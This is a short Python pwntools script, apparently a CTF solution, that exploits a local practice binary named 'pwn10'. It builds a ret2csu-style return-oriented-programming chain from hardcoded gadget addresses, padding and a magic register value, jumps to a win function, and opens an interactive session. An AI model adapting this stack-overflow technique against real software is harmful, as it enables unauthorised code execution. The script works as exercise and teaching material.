from pwn import *


io = process('./pwn10')

# mov r15 -> rdx, mov r14 -> rsi, mov r13d -> edi, call ptr(r12 + rbx*8)
movAndCall = p64(0x400880)
# pop in the following order: rbx, rbp, r12, r13, r14, r15
popAllRegisters = p64(0x40089a)
ret2win = p64(0x04007b1)
valueForRdx = p64(0xdeadcafebabebeef)
valueForR12 = p64(0x600e18)

initial = "A"*40
payload = initial + popAllRegisters + p64(0) + p64(1) + valueForR12 + p64(0) + p64(0) + valueForRdx + movAndCall
payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + p64(0) + ret2win

io.send(payload)
open('output','w').write(payload)

io.interactive()